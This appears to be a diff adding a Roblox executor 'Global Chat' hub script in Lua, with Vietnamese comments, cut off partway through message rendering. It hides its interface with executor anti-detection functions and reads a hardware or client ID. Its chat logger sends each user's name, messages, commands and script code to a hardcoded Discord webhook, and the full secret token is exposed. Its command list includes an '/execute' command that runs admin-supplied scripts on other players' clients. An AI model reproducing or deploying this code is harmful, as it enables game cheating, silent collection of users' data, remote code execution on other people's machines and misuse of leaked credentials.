@@ -1,0 +1,808 @@
+-- Intro / Compatibility Check ở đầu
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local IntroGui = Instance.new("ScreenGui", gethui and gethui() or CoreGui)
+IntroGui.Name = "AltisGlobal_Intro"
+IntroGui.ResetOnSpawn = false
+pcall(function() syn.protect_gui(IntroGui) end)
+
+local MainFrame = Instance.new("Frame", IntroGui)
+MainFrame.Size = UDim2.new(0, 380, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -190, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
+
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.BackgroundTransparency = 1
+Title.Text = "Altis Hub - System Checker (V29.1)"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+
+local function createCheckRow(name, posY)
+    local label = Instance.new("TextLabel", MainFrame)
+    label.Size = UDim2.new(1, -40, 0, 30)
+    label.Position = UDim2.new(0, 20, 0, posY)
+    label.BackgroundTransparency = 1
+    label.Text = name .. ": Đang kiểm tra..."
+    label.TextColor3 = Color3.fromRGB(200, 200, 200)
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 13
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    return label
+end
+
+local lblHttp = createCheckRow("1. HTTP Request & Webhook", 55)
+local lblFile = createCheckRow("2. File System (writefile / isfile)", 90)
+local lblUI = createCheckRow("3. UI Protection (gethui / protect_gui)", 125)
+
+local StatusLabel = Instance.new("TextLabel", MainFrame)
+StatusLabel.Size = UDim2.new(1, -40, 0, 35)
+StatusLabel.Position = UDim2.new(0, 20, 0, 165)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Đang phân tích cấu hình Executor..."
+StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+StatusLabel.Font = Enum.Font.GothamBold
+StatusLabel.TextSize = 13
+
+task.wait(1)
+
+local hasHttp = (syn and syn.request) or (http and http.request) or request
+local hasFile = writefile and isfile and readfile and isfolder and makefolder
+local hasUI = gethui or (syn and syn.protect_gui)
+
+if hasHttp then
+    lblHttp.Text = "1. HTTP Request & Webhook: ✅ Hỗ trợ"
+    lblHttp.TextColor3 = Color3.fromRGB(100, 255, 100)
+else
+    lblHttp.Text = "1. HTTP Request & Webhook: ❌ Không hỗ trợ"
+    lblHttp.TextColor3 = Color3.fromRGB(255, 100, 100)
+end
+
+task.wait(0.5)
+
+if hasFile then
+    lblFile.Text = "2. File System: ✅ Hỗ trợ"
+    lblFile.TextColor3 = Color3.fromRGB(100, 255, 100)
+else
+    lblFile.Text = "2. File System: ❌ Không hỗ trợ"
+    lblFile.TextColor3 = Color3.fromRGB(255, 100, 100)
+end
+
+task.wait(0.5)
+
+if hasUI then
+    lblUI.Text = "3. UI Protection: ✅ Hỗ trợ"
+    lblUI.TextColor3 = Color3.fromRGB(100, 255, 100)
+else
+    lblUI.Text = "3. UI Protection: ❌ Không hỗ trợ"
+    lblUI.TextColor3 = Color3.fromRGB(255, 100, 100)
+end
+
+task.wait(1)
+
+if not hasHttp then
+    StatusLabel.Text = "⛔ Executor không hỗ trợ HTTP Request,Vui lòng đổi Executor"
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+
+    local CloseBtn = Instance.new("TextButton", MainFrame)
+    CloseBtn.Size = UDim2.new(0, 100, 0, 30)
+    CloseBtn.Position = UDim2.new(0.5, -50, 1, -40)
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CloseBtn.Text = "ĐÓNG"
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseBtn.Font = Enum.Font.GothamBold
+    CloseBtn.TextSize = 12
+    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
+
+    CloseBtn.MouseButton1Click:Connect(function()
+        IntroGui:Destroy()
+    end)
+
+    return
+end
+
+StatusLabel.Text = "🚀 Executor tương thích! Đang khởi động script Global Chat..."
+StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+
+task.wait(1)
+IntroGui:Destroy()
+
+-- ===== PHẦN FULL SOURCE V29.1 =====
+-- Altis Hub - Global Chat V29.1 (Webhook Logger, HeadOwner, Multi-Target)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+local http_request = (syn and syn.request) or (http and http.request) or request or function() warn("Executor không hỗ trợ HTTP") return nil end
+
+---------------------------------------------------
+-- CẤU HÌNH WEBHOOK & UI
+---------------------------------------------------
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1530461171977818255/9D3YDtO2N28AqX_kM5G4q4abtFxaoc1jddlzCJe4yK7BYU7tZtBumRjsf128D-fgw5R_"
+local UI_WIDTH_SCALE = 0.4
+local UI_HEIGHT_SCALE = 0.6
+
+---------------------------------------------------
+-- HÀM GỬI WEBHOOK LOG
+---------------------------------------------------
+local function sendLogToDiscord(chatType, role, message, image, command, target, scriptCode)
+    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end
+    task.spawn(function()
+        local titleStr = "Title: hệ thống tin nhắn kênh chat(" .. chatType:lower() .. ") logger"
+        
+        local desc = "## Người Dùng:\n`" .. LocalPlayer.DisplayName .. "(@" .. LocalPlayer.Name .. ")`\n\n"
+        desc = desc .. "## Vai trò:\n`" .. role .. "`\n\n"
+        
+        if message and message ~= "" then 
+            desc = desc .. "## Tin Nhắn:\n`" .. message .. "`\n\n" 
+        end
+        if image and image ~= "" then 
+            desc = desc .. "## Ảnh:\n`" .. image .. "`\n\n" 
+        end
+        if command and command ~= "" then
+            desc = desc .. "## Lệnh:\n`" .. command .. "`\n"
+            if target and target ~= "" then 
+                desc = desc .. "### Đối Tượng:\n`" .. target .. "`\n" 
+            end
+            if scriptCode and scriptCode ~= "" then 
+                desc = desc .. "### Script\n```lua\n" .. scriptCode .. "\n```\n\n" 
+            else 
+                desc = desc .. "\n" 
+            end
+        end
+        
+        desc = desc .. "## Thời Gian:\n`" .. os.date("%H:%M:%S - %d/%m/%Y") .. "`"
+
+        -- Sử dụng API Web của Roblox để lấy hình đại diện làm Avatar Bot Discord
+        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+        local botName = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")"
+
+        local payload = {
+            ["username"] = botName,
+            ["avatar_url"] = avatarUrl,
+            ["embeds"] = {{
+                ["title"] = titleStr,
+                ["description"] = desc,
+                ["color"] = chatType == "admin" and 16711680 or 65280 -- Đỏ cho admin, Xanh lá cho chat thường
+            }}
+        }
+
+        pcall(function()
+            http_request({
+                Url = DISCORD_WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end)
+end
+
+---------------------------------------------------
+-- CẤU TRÚC FIREBASE & HỆ THỐNG ROLE
+---------------------------------------------------
+local FIREBASE_URL = "https://myfirstproject-e1354-default-rtdb.firebaseio.com/"
+local PATH_CHAT = "globalchat/chat.json"
+local PATH_ADMINCHAT = "globalchat/adminchat.json"
+local PATH_ONLINE = "globalchat/online/"
+local PATH_BAN = "globalchat/ban/"
+local PATH_ROLES = "globalchat/roles/"
+local PATH_CMDS = "globalchat/commands.json"
+
+local function getHWID()
+    local hwid = "UNKNOWN"
+    pcall(function() hwid = (gethwid and gethwid()) or game:GetService("RbxAnalyticsService"):GetClientId() end)
+    return tostring(hwid):gsub("[%.%#%$%[%]]", "")
+end
+local myHWID = getHWID()
+
+local HEADOWNER_USER = "hoang_huy1k9"
+local ROLES = {}
+local OnlineUsersList = {}
+
+local RANK_WEIGHTS = {USER = 1, ADMIN = 2, OWNER = 3, HEADOWNER = 4}
+local isBanned, running = false, true
+local COOLDOWN, lastSend, lastAdminSend = 1, 0, 0
+local startTime, adminStartTime = os.time(), os.time()
+local seen, seenAdmin = {}, {}
+local MAX_MSGS = 50
+local isInitialLoad = true
+
+task.delay(3, function() isInitialLoad = false end)
+
+local function fetchRoles()
+    local res = http_request({Url = FIREBASE_URL .. PATH_ROLES .. ".json", Method = "GET"})
+    if res and res.StatusCode == 200 and res.Body ~= "null" then
+        pcall(function() ROLES = HttpService:JSONDecode(res.Body) or {} end)
+    end
+end
+fetchRoles()
+
+local function getRole(user)
+    if user == HEADOWNER_USER then return "HEADOWNER" end
+    if ROLES[user] == "OWNER" then return "OWNER" end
+    if ROLES[user] == "ADMIN" then return "ADMIN" end
+    return "USER"
+end
+local myLiveRole = getRole(LocalPlayer.Name)
+local myWeight = RANK_WEIGHTS[myLiveRole]
+
+local initBanCheck = http_request({Url = FIREBASE_URL .. PATH_BAN .. myHWID .. ".json", Method = "GET"})
+if initBanCheck and initBanCheck.StatusCode == 200 and initBanCheck.Body == "true" then LocalPlayer:Kick("Bị ban khỏi hệ thống") return end
+
+---------------------------------------------------
+-- CACHE ẢNH
+---------------------------------------------------
+local function getCacheAsset(url)
+    if not url or url == "" then return nil end
+    if url:match("^rbxassetid://") then return url end
+    
+    if not (writefile and isfile and getcustomasset and isfolder and makefolder) then return nil end
+    pcall(function() if not isfolder("AltisImages") then makefolder("AltisImages") end end)
+    
+    local hash = 0; for i = 1, #url do hash = (hash + string.byte(url, i)) % 9999999 end
+    local ext = url:match("%.png") and ".png" or ".jpg"
+    local path = "AltisImages/" .. hash .. ext
+    
+    if isfile(path) then return getcustomasset(path) end
+    local s, data = pcall(function() return game:HttpGet(url) end)
+    if s and data then writefile(path, data); return getcustomasset(path) end
+    return nil
+end
+
+---------------------------------------------------
+-- KHỞI TẠO GIAO DIỆN
+---------------------------------------------------
+-- Đã thêm việc xóa cả version V29 cũ để tránh trùng lặp UI
+for _, v in ipairs(CoreGui:GetChildren()) do 
+    if v.Name == "AltisGlobal_V29.1" or v.Name == "AltisGlobal_V29" or v.Name == "AltisGlobal_V28" or v.Name == "AltisGlobal_V28_1" then 
+        v:Destroy() 
+    end 
+end
+
+local GUI = Instance.new("ScreenGui", gethui and gethui() or CoreGui)
+GUI.Name = "AltisGlobal_V29.1"
+GUI.ResetOnSpawn = false
+pcall(function() syn.protect_gui(GUI) end)
+
+local MainFrame = Instance.new("Frame", GUI)
+MainFrame.Size = UDim2.new(UI_WIDTH_SCALE, 0, UI_HEIGHT_SCALE, 0) 
+MainFrame.Position = UDim2.new((1 - UI_WIDTH_SCALE)/2, 0, (1 - UI_HEIGHT_SCALE)/2, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35); MainFrame.BorderSizePixel = 0
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
+local sizeConstraint = Instance.new("UISizeConstraint", MainFrame)
+sizeConstraint.MinSize = Vector2.new(450, 350)
+
+-- Topbar
+local Topbar = Instance.new("Frame", MainFrame)
+Topbar.Size = UDim2.new(1, 0, 0, 35); Topbar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+Topbar.ZIndex = 10; Instance.new("UICorner", Topbar).CornerRadius = UDim.new(0, 8)
+
+local Title = Instance.new("TextLabel", Topbar)
+Title.Size = UDim2.new(1, -45, 1, 0); Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1; Title.Text = "Altis Hub - Global Chat V29.1"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.Font = Enum.Font.GothamBold; Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left; Title.ZIndex = 10
+
+local MinBtn = Instance.new("TextButton", Topbar)
+MinBtn.Size = UDim2.new(0, 35, 0, 35); MinBtn.Position = UDim2.new(1, -35, 0, 0) 
+MinBtn.BackgroundTransparency = 1; MinBtn.Text = "-"; MinBtn.TextColor3 = Color3.fromRGB(200, 200, 200); MinBtn.TextSize = 25; MinBtn.Font = Enum.Font.GothamBold; MinBtn.ZIndex = 10
+
+-- Kéo thả UI
+local dragToggle, dragStart, startPos
+Topbar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragToggle = true; dragStart = input.Position; startPos = MainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragToggle = false end
+end)
+
+local InputContainer, AdminBlocker
+
+-- Tab Bar
+local TabBar = Instance.new("Frame", MainFrame)
+TabBar.Size = UDim2.new(1, 0, 0, 40); TabBar.Position = UDim2.new(0, 0, 0, 35)
+TabBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+local TabList = Instance.new("UIListLayout", TabBar); TabList.FillDirection = Enum.FillDirection.Horizontal; TabList.Padding = UDim.new(0, 4)
+local TabPad = Instance.new("UIPadding", TabBar); TabPad.PaddingTop = UDim.new(0,4); TabPad.PaddingLeft = UDim.new(0,4); TabPad.PaddingBottom = UDim.new(0,4); TabPad.PaddingRight = UDim.new(0,4)
+
+local ContentArea = Instance.new("Frame", MainFrame)
+ContentArea.Size = UDim2.new(1, 0, 1, -160); ContentArea.Position = UDim2.new(0, 0, 0, 75)
+ContentArea.BackgroundTransparency = 1
+
+local Pages, TabBtns = {}, {}
+local currentTab = "chat"
+
+local function updateInputVisibility()
+    if InputContainer then
+        local showInput = (currentTab == "chat" or currentTab == "admin")
+        InputContainer.Visible = showInput
+        ContentArea.Size = showInput and UDim2.new(1, 0, 1, -160) or UDim2.new(1, 0, 1, -75)
+    end
+end
+
+local function checkAdminAccess()
+    if AdminBlocker then AdminBlocker.Visible = (currentTab == "admin" and myWeight < 2) end
+end
+
+local function createTab(name, id, widthRatio)
+    local btn = Instance.new("TextButton", TabBar)
+    btn.Size = UDim2.new(widthRatio, -4, 1, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60); btn.BackgroundTransparency = 0.5
+    btn.Text = name; btn.TextColor3 = Color3.fromRGB(180, 180, 180); btn.Font = Enum.Font.GothamBold; btn.TextSize = 13
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    
+    local page = Instance.new("ScrollingFrame", ContentArea)
+    page.Size = UDim2.new(1, 0, 1, 0); page.BackgroundTransparency = 1; page.ScrollBarThickness = 4
+    page.CanvasSize = UDim2.new(0, 0, 0, 0); page.AutomaticCanvasSize = Enum.AutomaticSize.None; page.Visible = false
+    
+    local layout = Instance.new("UIListLayout", page); layout.Padding = UDim.new(0, 10)
+    local pad = Instance.new("UIPadding", page); pad.PaddingTop = UDim.new(0,10); pad.PaddingBottom = UDim.new(0,10); pad.PaddingLeft = UDim.new(0,10); pad.PaddingRight = UDim.new(0,10)
+
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        page.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
+        page.CanvasPosition = Vector2.new(0, layout.AbsoluteContentSize.Y + 1000)
+    end)
+
+    Pages[id], TabBtns[id] = page, btn
+    
+    btn.MouseButton1Click:Connect(function()
+        currentTab = id; 
+        for k, p in pairs(Pages) do p.Visible = (k == id) end
+        for k, b in pairs(TabBtns) do 
+            b.BackgroundTransparency = (k == id) and 0 or 0.6
+            b.TextColor3 = (k == id) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
+            b.BackgroundColor3 = (k == id) and Color3.fromRGB(70, 100, 150) or Color3.fromRGB(50, 50, 60)
+        end
+        checkAdminAccess(); updateInputVisibility()
+        if Pages[id] then
+            local pLayout = Pages[id]:FindFirstChildWhichIsA("UIListLayout")
+            if pLayout then Pages[id].CanvasPosition = Vector2.new(0, pLayout.AbsoluteContentSize.Y + 1000) end
+        end
+    end)
+end
+
+createTab("💬 Chat", "chat", 0.25)
+createTab("🛡️ Admin Chat", "admin", 0.25)
+createTab("🟢 Online", "users", 0.25)
+createTab("📜 Lệnh", "cmds", 0.25)
+
+TabBtns["chat"].BackgroundTransparency = 0; TabBtns["chat"].TextColor3 = Color3.fromRGB(255,255,255); TabBtns["chat"].BackgroundColor3 = Color3.fromRGB(70, 100, 150)
+Pages["chat"].Visible = true
+
+---------------------------------------------------
+-- ADMIN BLOCKER OVERLAY
+---------------------------------------------------
+AdminBlocker = Instance.new("Frame", MainFrame)
+AdminBlocker.Size = UDim2.new(1, 0, 1, -75); AdminBlocker.Position = UDim2.new(0, 0, 0, 75)
+AdminBlocker.BackgroundColor3 = Color3.fromRGB(15, 15, 20); AdminBlocker.BackgroundTransparency = 0
+AdminBlocker.Active = true; AdminBlocker.ZIndex = 9; AdminBlocker.Visible = false
+Instance.new("UICorner", AdminBlocker).CornerRadius = UDim.new(0, 8)
+
+local BlockerText = Instance.new("TextLabel", AdminBlocker)
+BlockerText.Size = UDim2.new(1, 0, 1, 0); BlockerText.Position = UDim2.new(0,0,0,0)
+BlockerText.BackgroundTransparency = 1; BlockerText.Text = "⛔\nBạn không có quyền truy cập Admin Chat!"
+BlockerText.TextColor3 = Color3.fromRGB(255, 100, 100); BlockerText.Font = Enum.Font.GothamBold; BlockerText.TextSize = 16; BlockerText.ZIndex = 10
+
+---------------------------------------------------
+-- DANH SÁCH LỆNH V29.1
+---------------------------------------------------
+local COMMANDS = {
+    {cmd = "execute", desc = "Chạy script (Rank bạn > Mục tiêu)", format = '/execute "@mục_tiêu" script', minRank = 2},
+    {cmd = "ban", desc = "Cấm người chơi", format = '/ban "@mục_tiêu"', minRank = 2},
+    {cmd = "unban", desc = "Gỡ cấm", format = '/unban "@mục_tiêu"', minRank = 2},
+    {cmd = "addadmin", desc = "Cấp Admin", format = '/addadmin "@mục_tiêu"', minRank = 3},
+    {cmd = "removeadmin", desc = "Xóa Admin", format = '/removeadmin "@mục_tiêu"', minRank = 3},
+    {cmd = "addowner", desc = "Cấp Owner", format = '/addowner "@mục_tiêu"', minRank = 4},
+    {cmd = "removeowner", desc = "Xóa Owner", format = '/removeowner "@mục_tiêu"', minRank = 4},
+    {cmd = "clear", desc = "Xóa lịch sử UI", format = '/clear', minRank = 1}
+}
+
+for _, c in ipairs(COMMANDS) do
+    local frm = Instance.new("Frame", Pages["cmds"]); frm.Size = UDim2.new(1, 0, 0, 0); frm.AutomaticSize = Enum.AutomaticSize.Y; frm.BackgroundColor3 = Color3.fromRGB(45,45,50)
+    Instance.new("UICorner", frm).CornerRadius = UDim.new(0,6)
+    local l = Instance.new("UIListLayout", frm); l.Padding = UDim.new(0,4)
+    local p = Instance.new("UIPadding", frm); p.PaddingTop = UDim.new(0,8); p.PaddingBottom=UDim.new(0,8); p.PaddingLeft=UDim.new(0,12); p.PaddingRight=UDim.new(0,12)
+    
+    local t1 = Instance.new("TextLabel", frm); t1.BackgroundTransparency = 1; t1.Size = UDim2.new(1,0,0,20); t1.Text = "👉 " .. c.format
+    t1.TextColor3 = Color3.fromRGB(255,200,100); t1.Font = Enum.Font.GothamBold; t1.TextSize = 14; t1.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local rankReq = c.minRank==4 and "HEADOWNER" or c.minRank==3 and "OWNER" or c.minRank==2 and "ADMIN" or "USER"
+    local t2 = Instance.new("TextLabel", frm); t2.BackgroundTransparency = 1; t2.Size = UDim2.new(1,0,0,0); t2.AutomaticSize = Enum.AutomaticSize.Y
+    t2.Text = c.desc .. " (Yêu cầu: " .. rankReq .. ")"; t2.TextWrapped = true
+    t2.TextColor3 = Color3.fromRGB(200,200,200); t2.Font = Enum.Font.Gotham; t2.TextSize = 13; t2.TextXAlignment = Enum.TextXAlignment.Left
+end
+
+---------------------------------------------------
+-- KHU VỰC TEXTBOXES & GỢI Ý LỆNH
+---------------------------------------------------
+InputContainer = Instance.new("Frame", MainFrame)
+InputContainer.Size = UDim2.new(1, 0, 0, 85); InputContainer.Position = UDim2.new(0, 0, 1, -85)
+InputContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+
+local MsgBox = Instance.new("TextBox", InputContainer)
+MsgBox.Size = UDim2.new(1, -95, 0, 35); MsgBox.Position = UDim2.new(0, 10, 0, 5)
+MsgBox.BackgroundColor3 = Color3.fromRGB(45, 45, 50); MsgBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+MsgBox.PlaceholderText = "Nhập tin nhắn hoặc lệnh..."
+MsgBox.Font = Enum.Font.Gotham; MsgBox.TextSize = 13; MsgBox.TextWrapped = true; MsgBox.TextXAlignment = Enum.TextXAlignment.Left; MsgBox.ClearTextOnFocus = false
+Instance.new("UICorner", MsgBox).CornerRadius = UDim.new(0, 6); Instance.new("UIPadding", MsgBox).PaddingLeft = UDim.new(0, 10)
+
+local ImgBox = Instance.new("TextBox", InputContainer)
+ImgBox.Size = UDim2.new(1, -95, 0, 35); ImgBox.Position = UDim2.new(0, 10, 0, 45)
+ImgBox.BackgroundColor3 = Color3.fromRGB(45, 45, 50); ImgBox.TextColor3 = Color3.fromRGB(200, 200, 255)
+ImgBox.PlaceholderText = "Dán link ảnh (.jpg/.png) hoặc rbxassetid://..."
+ImgBox.Font = Enum.Font.Gotham; ImgBox.TextSize = 12; ImgBox.TextWrapped = true; ImgBox.TextXAlignment = Enum.TextXAlignment.Left; ImgBox.ClearTextOnFocus = false
+Instance.new("UICorner", ImgBox).CornerRadius = UDim.new(0, 6); Instance.new("UIPadding", ImgBox).PaddingLeft = UDim.new(0, 10)
+
+local SendBtn = Instance.new("TextButton", InputContainer)
+SendBtn.Size = UDim2.new(0, 70, 0, 75); SendBtn.Position = UDim2.new(1, -80, 0, 5)
+SendBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 100); SendBtn.Text = "GỬI"; SendBtn.TextColor3 = Color3.fromRGB(20, 20, 20); SendBtn.Font = Enum.Font.GothamBold; SendBtn.TextSize = 14
+Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 6)
+
+local SuggestFrame = Instance.new("Frame", MainFrame)
+SuggestFrame.Size = UDim2.new(1, -95, 0, 150); SuggestFrame.Position = UDim2.new(0, 10, 1, -240)
+SuggestFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 60); SuggestFrame.Visible = false; SuggestFrame.ZIndex = 8
+Instance.new("UICorner", SuggestFrame).CornerRadius = UDim.new(0, 8)
+local sList = Instance.new("UIListLayout", SuggestFrame); sList.Padding = UDim.new(0,2)
+local sPad = Instance.new("UIPadding", SuggestFrame); sPad.PaddingTop=UDim.new(0,5); sPad.PaddingBottom=UDim.new(0,5); sPad.PaddingLeft=UDim.new(0,5); sPad.PaddingRight=UDim.new(0,5)
+
+local function updateSuggestions(text)
+    for _, v in ipairs(SuggestFrame:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+    if text:sub(1,1) ~= "/" then SuggestFrame.Visible = false return end
+    
+    local parts = string.split(text, " "); local cmdQuery = parts[1]:sub(2):lower(); local targetQuery = parts[2] and parts[2]:gsub('"', '') or ""; local found = 0
+
+    if #parts == 1 then
+        for _, c in ipairs(COMMANDS) do
+            if c.minRank <= myWeight and c.cmd:lower():sub(1, #cmdQuery) == cmdQuery then
+                found = found + 1
+                local b = Instance.new("TextButton", SuggestFrame); b.Size = UDim2.new(1,0,0,25); b.BackgroundTransparency=1; b.ZIndex=8
+                b.Text = "/" .. c.cmd .. " - " .. c.desc; b.TextColor3 = Color3.fromRGB(200,255,200); b.Font = Enum.Font.Gotham; b.TextSize=12; b.TextXAlignment = Enum.TextXAlignment.Left
+                b.MouseButton1Click:Connect(function() MsgBox.Text = "/" .. c.cmd .. ' "" '; MsgBox:CaptureFocus() end)
+            end
+        end
+    elseif #parts >= 2 then
+        local isValidCmd = false
+        for _, c in ipairs(COMMANDS) do if c.cmd == cmdQuery and c.minRank <= myWeight then isValidCmd = true break end end
+        
+        if isValidCmd then
+            local specialGroups = {"all", "others"}
+            for _, sg in ipairs(specialGroups) do
+                if sg:sub(1, #targetQuery) == targetQuery:lower() then
+                    found = found + 1
+                    local b = Instance.new("TextButton", SuggestFrame); b.Size = UDim2.new(1,0,0,25); b.BackgroundTransparency=1; b.ZIndex=8
+                    b.Text = "🌐 " .. sg; b.TextColor3 = Color3.fromRGB(150,200,255); b.Font = Enum.Font.GothamBold; b.TextSize=12; b.TextXAlignment = Enum.TextXAlignment.Left
+                    b.MouseButton1Click:Connect(function() MsgBox.Text = "/" .. cmdQuery .. ' "' .. sg .. '" '; MsgBox:CaptureFocus() end)
+                end
+            end
+            for name, _ in pairs(OnlineUsersList) do
+                local atName = "@" .. name
+                if atName:lower():sub(1, #targetQuery) == targetQuery:lower() or name:lower():sub(1, #targetQuery) == targetQuery:lower() then
+                    found = found + 1
+                    local b = Instance.new("TextButton", SuggestFrame); b.Size = UDim2.new(1,0,0,25); b.BackgroundTransparency=1; b.ZIndex=8
+                    b.Text = "👤 " .. atName; b.TextColor3 = Color3.fromRGB(255,200,100); b.Font = Enum.Font.Gotham; b.TextSize=12; b.TextXAlignment = Enum.TextXAlignment.Left
+                    b.MouseButton1Click:Connect(function() MsgBox.Text = "/" .. cmdQuery .. ' "' .. atName .. '" '; MsgBox:CaptureFocus() end)
+                end
+            end
+        end
+    end
+    SuggestFrame.Size = UDim2.new(1, -95, 0, (found * 27) + 10)
+    SuggestFrame.Position = UDim2.new(0, 10, 1, -85 - SuggestFrame.Size.Y.Offset - 5)
+    SuggestFrame.Visible = (found > 0)
+end
+MsgBox:GetPropertyChangedSignal("Text"):Connect(function() updateSuggestions(MsgBox.Text) end)
+
+---------------------------------------------------
+-- KẾT NỐI MINIMIZE
+---------------------------------------------------
+local isMinimized = false
+MinBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        MainFrame.ClipsDescendants = true; MainFrame.Size = UDim2.new(UI_WIDTH_SCALE, 0, 0, 35); sizeConstraint.MinSize = Vector2.new(450, 35)
+        TabBar.Visible = false; ContentArea.Visible = false; InputContainer.Visible = false; SuggestFrame.Visible = false; AdminBlocker.Visible = false
+    else
+        sizeConstraint.MinSize = Vector2.new(450, 350); MainFrame.Size = UDim2.new(UI_WIDTH_SCALE, 0, UI_HEIGHT_SCALE, 0); MainFrame.ClipsDescendants = false
+        TabBar.Visible = true; ContentArea.Visible = true; updateInputVisibility(); checkAdminAccess()
+    end
+end)
+
+---------------------------------------------------
+-- RENDER TIN NHẮN
+---------------------------------------------------
+local msgFrames, adminMsgFrames = {}, {}
+
+local function renderMessage(msgData, page, storageTbl)
+    local uName = msgData.username or "Unknown"
+    local dName = msgData.displayName or "Unknown"
+    local uId = tonumber(msgData.userId) or 1
+    local tStamp = msgData.timestamp or os.time()
+    
+    local isSelf = (uName == LocalPlayer.Name)
+    local senderRole = getRole(uName)
+    local senderWeight = RANK_WEIGHTS[senderRole] or 1
+    
+    local roleStr = (senderRole == "HEADOWNER") and "[👑 HEADOWNER]" or (senderRole == "OWNER") and "[⭐ OWNER]" or (senderRole == "ADMIN") and "[🛡️ ADMIN]" or "[👤 USER]"
+    local canSeeHWID = isSelf or (myWeight > senderWeight)
+    
+    local timeString = os.date("%H:%M", tStamp)
+    
+    if not isInitialLoad and not isSelf then
+        pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "💬 " .. dName, Text = (msgData.message and msgData.message ~= "" and msgData.message or "[Đã gửi ảnh]"), Icon = "rbxthumb://type=AvatarHeadShot&id=" .. uId .. "&w=150&h=150", Duration = 4}) end)
+    end
+
+    local Frame = Instance.new("Frame", page)
+    Frame.BackgroundColor3 = isSelf and Color3.fromRGB(65, 95, 135) or Color3.fromRGB(50, 55, 65)
+    Frame.Size = UDim2.new(1, 0, 0, 0); Frame.AutomaticSize = Enum.AutomaticSize.Y
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
+    Instance.new("UIListLayout", Frame).Padding = UDim.new(0, 6)
+    local pad = Instance.new("UIPadding", Frame); pad.PaddingTop=UDim.new(0,10); pad.PaddingBottom=UDim.new(0,10); pad.PaddingLeft=UDim.new(0,10); pad.PaddingRight=UDim.new(0,10)
+
+    local TopSection = Instance.new("Frame", Frame)
+    TopSection.BackgroundTransparency = 1; TopSection.Size = UDim2.new(1, 0, 0, 36)
+
+    local Avatar = Instance.new("ImageLabel", TopSection)
+    Avatar.Size = UDim2.new(0, 36, 0, 36); Avatar.BackgroundColor3 = Color3.fromRGB(100,100,100); Avatar.ScaleType = Enum.ScaleType.Crop
+    Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1, 0)
+    Avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. uId .. "&w=150&h=150"
+
+    local InfoSection = Instance.new("Frame", TopSection)
+    InfoSection.BackgroundTransparency = 1; InfoSection.Size = UDim2.new(1, -45, 1, 0); InfoSection.Position = UDim2.new(0, 45, 0, 0)
+    local InfoLayout = Instance.new("UIListLayout", InfoSection); InfoLayout.Padding = UDim.new(0, 2); InfoLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+
